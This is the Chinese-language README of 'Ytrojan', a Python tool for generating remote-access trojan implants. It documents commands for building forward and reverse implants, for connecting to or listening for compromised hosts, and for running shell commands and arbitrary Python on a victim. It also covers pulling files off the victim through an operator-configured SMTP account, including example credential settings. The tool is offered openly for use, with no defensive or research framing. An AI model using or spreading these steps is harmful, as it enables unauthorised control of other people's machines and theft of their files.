# Ytrojan

Ytrojan 一个简易的木马生成工具

## 选择语言/Select Your Language

   [English](/README.md)|简体中文

## 如何使用Ytrojan

用Python 3.10或以上版本的解释器运行Main-Cmd.py

运行结果
```
__   ___             _             
\ \ / / |_ _ __ ___ (_) __ _ _ __  
 \ V /| __| '__/ _ \| |/ _` | '_ \ 
  | | | |_| | | (_) | | (_| | | | |
  |_|  \__|_|  \___// |\__,_|_| |_|
                  |__/             
                                      
Ytrojan $>
```  

### 使用generate命令生成被控端  

```
generate [选项] [路径] [ip] [port]

1. [选项] 可选0和1
   当选项的值为0时 生成的为反向被控端
   当选项的值为1时 生成的为正向被控端
2. [路径] 被控端生成位置
3. [ip] 本机或目标的ip
   [port] 本机或目标的port
   当选项的值为0时 ip与port为本机
   当选项的值为1时 ip与port为被控端

当弹出 parameters $> 意味这您需要提供您想要的被控端功能
目前仅支持 shell,getfile,pycmd

例如您想要被控端可以执行shell和py语句 您可以这样操作
parameters $>shell pycmd

```  

### 使用connect命令连接正向木马的被控端

```
connect [ip] [port]

1. [ip][port] 均为目标
2. 此命令要运行在被控端之后!
```  

### 使用listen命令接受反向木马被控端的连接  

```
listen [ip] [port]

1. [ip][port] 均为本机
2. 此命令要运行在被控端之前!
```  

### 如何操作目标  

在连接到目标后 可以通过以下命令操作(连接到目标或会输出"ip $>")  

```
1. shell [命令]         #执行shell
2. getfile [文件路径]    #获取文件
3. pycmd [语句]         #执行python语句
```  

例如
```
1. shell whoami #执行whoami
   shell id     #执行id
   shell ls     #执行ls

2. getfile a.txt    #获取a.txt
   getfile /a.jpg   #获取根目录下的a.jpg  

3. pycmd print('hello world')    #在目标上输出hello world
   pycmd import os;print(os.name)#获取目标操作系统信息
```  

在这其中请注意shell和getfile命令!!!

shell命令是非交互式shell 您无法执行vim sudo 这样的命令!!!  

getfile使用smtp传输文件 您在使用时要先如下操作!!!  

```
$> pycmd host = "smtp服务器域名" #例如163的smtp.163.com
YES
$> pycmd port = "smtp服务所在端口" #一般是25端口
YES
$> pycmd username = "您的邮箱"
YES
$> pycmd password = "smtp运营商提供给您的密码" 
YES
$>....
```
